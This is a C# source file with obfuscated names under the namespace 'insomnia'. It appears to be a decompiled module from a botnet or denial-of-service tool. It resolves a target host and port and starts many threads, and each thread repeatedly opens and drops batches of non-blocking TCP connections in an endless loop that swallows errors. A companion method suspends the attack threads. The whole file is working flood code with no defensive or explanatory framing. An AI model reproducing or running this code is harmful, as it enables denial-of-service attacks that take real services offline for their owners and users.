using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace insomnia;

internal class Class22
{
	private class Class23
	{
		private IPEndPoint Field3;

		private Socket[] Field2;

		private int Field1;

		public Class23(IPEndPoint ipEo, int SynSockets)
		{
			Field3 = ipEo;
			Field1 = SynSockets;
		}

		public void Method2(IAsyncResult A_1)
		{
		}

		public void Method1()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						Field2 = new Socket[Field1];
						for (int i = 0; i < Field1; i++)
						{
							Field2[i] = new Socket(Field3.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
							Field2[i].Blocking = false;
							AsyncCallback callback = Method2;
							Field2[i].BeginConnect(Field3, callback, Field2[i]);
						}
						Thread.Sleep(100);
						for (int i = 0; i < Field1; i++)
						{
							if (Field2[i].Connected)
							{
								Field2[i].Disconnect(reuseSocket: false);
							}
							Field2[i].Close();
							Field2[i] = null;
						}
						Field2 = null;
					}
				}
				catch
				{
					for (int i = 0; i < Field1; i++)
					{
						try
						{
							if (Field2[i].Connected)
							{
								Field2[i].Disconnect(reuseSocket: false);
							}
							Field2[i].Close();
							Field2[i] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private static ThreadStart[] Field9;

	private static Thread[] Field8;

	public static string Field7;

	private static IPEndPoint Field6;

	public static int Field5;

	private static Class23[] Field4;

	public static int Field3;

	public static int Field2;

	public static bool Field1 = false;

	public static void Method2()
	{
		try
		{
			Field6 = new IPEndPoint(Dns.GetHostEntry(Field7).AddressList[0], Field5);
		}
		catch
		{
			Field6 = new IPEndPoint(IPAddress.Parse(Field7), Field5);
		}
		Field8 = new Thread[Field2];
		Field9 = new ThreadStart[Field2];
		Field4 = new Class23[Field2];
		for (int i = 0; i < Field2; i++)
		{
			Field4[i] = new Class23(Field6, Field3);
			Field9[i] = Field4[i].Method1;
			Field8[i] = new Thread(Field9[i]);
			Field8[i].Start();
		}
	}

	public static void Method1()
	{
		for (int i = 0; i < Field2; i++)
		{
			try
			{
				Field8[i].Suspend();
			}
			catch
			{
			}
		}
	}
}
